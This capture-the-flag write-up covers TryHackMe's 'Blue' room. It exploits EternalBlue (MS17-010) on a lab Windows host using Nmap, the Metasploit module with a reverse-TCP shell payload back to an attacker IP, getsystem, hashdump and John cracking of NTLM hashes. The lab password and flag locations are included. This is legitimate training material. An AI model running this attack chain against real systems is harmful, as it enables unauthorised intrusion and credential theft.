# TryHackMe — Blue WriteUp

**Room**: [Blue](https://tryhackme.com/room/blue)
**Category**: Exploitation of SMB & Windows
**Description**: Demonstrate exploitation of MS17-010 (EternalBlue) on a vulnerable Windows host.

---
## Tools
- **Nmap** (service/OS and vulnerability scripts)
- **Metasploit** (exploit and post modules)
- **John** (password cracking)
---
## Target
- IP: `10.201.74.172` (exported as an environment variable for convenience)
```bash
# Set target IP for easier command reuse
export IP=10.201.74.172
```

---
# Task 1: Recon

To start I performed an Nmap scan to identify open ports, services, and potential vulnerabilities:
```bash
nmap -sV -sC -sS -T4 --script vuln $IP
```

![[Pasted image 20250923144301.png]]
**Nmap scan findings**:
- Port 445 open and using `microsoft-ds` (SMB)
- OS fingerprint: Windows 7 Professional
- Nmap script reported the host as vulnerable to **ms17-010** (EternalBlue)
**Answers (TryHackMe)**
- Number of open ports under 1000: **3**
- Vulnerability identified: **ms17-010**
# Task 2: Gain Access 
Metasploit has a module for this exploit, so I started Metasploit to exploit MS17-010.

1. Search and select the EternalBlue module:
```bash
exploit/windows/smb/ms17_010_eternalblue
```
![[Pasted image 20250923145316.png]]

I selected the first module and ran `show options`:
![[Pasted image 20250923145833.png]]

I set the required options:
```bash
set RHOSTS 10.201.74.172
set LHOST <attacker_IP>
set payload windows/x64/shell/reverse_tcp

#replace <attacker_IP> to my IP
```

**Result:** Then I ran with these options set. It was a successful exploitation and a shell was obtained:
![[Pasted image 20250923153221.png]]
# Task 3: Escalate (Privilege Escalation)
Next I upgraded the shell to a Meterpreter. I backgrounded the previously gained shell (CTRL+Z):
![[Pasted image 20250923153422.png]]

I searched shell_to_meterpreter and it shows in the results:
![[Pasted image 20250923153739.png]]

I select:
```bash
post/multi/manage/shell_to_meterpreter
```

and set SESSION to 1:
![[Pasted image 20250923153855.png]]

![[Pasted image 20250923154135.png]]

After converting, I ran:
- `sysinfo` to confirm target OS and session info
- `getsystem` and `getuid` to verify SYSTEM privileges

![[Pasted image 20250923155633.png]]

I reviewed running processes and targeted `lsass` (a common process to extract credentials when privileged):
![[Pasted image 20250923161119.png]]

# Task 4: Cracking
Next I run the command 'hashdump' and retrieved NTLM hashes for `Administrator`, `Guest`, and `Jon`:

![[Pasted image 20250923161335.png]]

In another terminal I saved `Jon`'s NTLM hash to a file and cracked it with John:
```bash
john hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250923162748.png]]

**Cracked password for Jon:** `alqfna22`

With that password I authenticated and accessed the filesystem to retrieve flags:

First flag located at `C:\flag1.txt`
![[Pasted image 20250923164710.png]]

The next flag was located at `C:\Windows\System32\config\flag2.txt`:
![[Pasted image 20250923164410.png]]

Third (final) flag found in user Jon's directory: `C:\Users\Jon\Documents\flag3.txt`:
![[Pasted image 20250923165329.png]]

# Takeaways
- **EternalBlue** targets SMBv1 and can allow remote code execution on unpatched Windows systems.
- **Nmap scripts** (like `--script vuln` used in this CTF) are effective for quickly identifying vulnerable services during reconnaissance.
- **Metasploit** provides modules for exploitation and post-exploitation automation (shell to meterpreter, privilege checks, hash dumping). 
- **Credential harvesting and offline cracking** (hashdump → John) is a practical escalation path on Windows systems with weak passwords.
- **Older and widely-known exploits** are useful for labs and CTFs because they demonstrate exploitation methodology in its simplest form.
- **Patching** is essential.